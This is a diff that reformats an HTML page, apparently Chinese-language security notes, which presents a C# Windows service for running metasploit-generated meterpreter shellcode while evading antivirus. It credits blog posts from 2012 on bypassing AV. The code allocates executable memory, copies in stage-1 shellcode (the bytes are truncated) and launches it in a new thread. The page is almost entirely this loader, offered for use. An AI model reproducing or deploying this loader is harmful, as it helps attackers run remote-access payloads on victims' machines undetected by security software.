@@ -299,8 +299,7 @@
 <hr />
 <h2 id="_1">如下</h2>
 <p>建立对shellcode进行处理，防止被杀</p>
-<p>```c#
-// from 
+<pre><code>// from 
 // https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
 using System;
 using System.Collections.Generic;
@@ -310,22 +309,23 @@ using System.Diagnostics;
 using System.Linq;
 using System.ServiceProcess;
 using System.Text;
-using System.Runtime.InteropServices;</p>
-<p>namespace metservice
+using System.Runtime.InteropServices;
+
+namespace metservice
 {
     public partial class Service1 : ServiceBase
     {
         public Service1()
         {
             InitializeComponent();
-        }</p>
-<pre><code>    protected override void OnStart(string[] args)
-    {
-        // native function's compiled code
-        // generated with metasploit
-        byte[] shellcode = new byte[] {
-</code></pre>
-<p>0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            // native function's compiled code
+            // generated with metasploit
+            byte[] shellcode = new byte[] {
+0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
                 }; 
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
                                 MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -337,57 +337,58 @@ using System.Runtime.InteropServices;</p>
             // execute native code 
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
             WaitForSingleObject(hThread, 0xFFFFFFFF); 
-      }</p>
-<pre><code>    private static UInt32 MEM_COMMIT = 0x1000; 
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+      }
 
-    [DllImport("kernel32")]
-    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-         UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        private static UInt32 MEM_COMMIT = 0x1000; 
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
 
-    [DllImport("kernel32")]
-    private static extern bool VirtualFree(IntPtr lpAddress,
-                          UInt32 dwSize, UInt32 dwFreeType);
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
-    [DllImport("kernel32")]
-    private static extern IntPtr CreateThread( 
-      UInt32 lpThreadAttributes,
-      UInt32 dwStackSize,
-      UInt32 lpStartAddress,
-      IntPtr param,
-      UInt32 dwCreationFlags,
-      ref UInt32 lpThreadId 
-      );
-    [DllImport("kernel32")]
-    private static extern bool CloseHandle(IntPtr handle);
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool VirtualFree(IntPtr lpAddress,
+                              UInt32 dwSize, UInt32 dwFreeType);
 
-    [DllImport("kernel32")]
-    private static extern UInt32 WaitForSingleObject( 
-      IntPtr hHandle,
-      UInt32 dwMilliseconds
-      );
-    [DllImport("kernel32")]
-    private static extern IntPtr GetModuleHandle( 
-      string moduleName 
-      );
-    [DllImport("kernel32")]
-    private static extern UInt32 GetProcAddress( 
-      IntPtr hModule,
-      string procName 
-      );
-    [DllImport("kernel32")]
-    private static extern UInt32 LoadLibrary( 
-      string lpFileName 
-      );
-    [DllImport("kernel32")]
-    private static extern UInt32 GetLastError(); 
-    protected override void OnStop()
-    {
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr CreateThread( 
+          UInt32 lpThreadAttributes,
+          UInt32 dwStackSize,
+          UInt32 lpStartAddress,
+          IntPtr param,
+          UInt32 dwCreationFlags,
+          ref UInt32 lpThreadId 
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool CloseHandle(IntPtr handle);
+
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 WaitForSingleObject( 
+          IntPtr hHandle,
+          UInt32 dwMilliseconds
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr GetModuleHandle( 
+          string moduleName 
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetProcAddress( 
+          IntPtr hModule,
+          string procName 
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 LoadLibrary( 
+          string lpFileName 
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetLastError(); 
+        protected override void OnStop()
+        {
+        }
     }
 }
 </code></pre>
-<p>}
-```</p>
+
 <h2 id="_2">引用</h2>
 <ul>
 <li><a href="https://www.mattandreko.com/2012/02/23/using-net-to-bypass-av/">Using .net to Bypass AV</a></li>
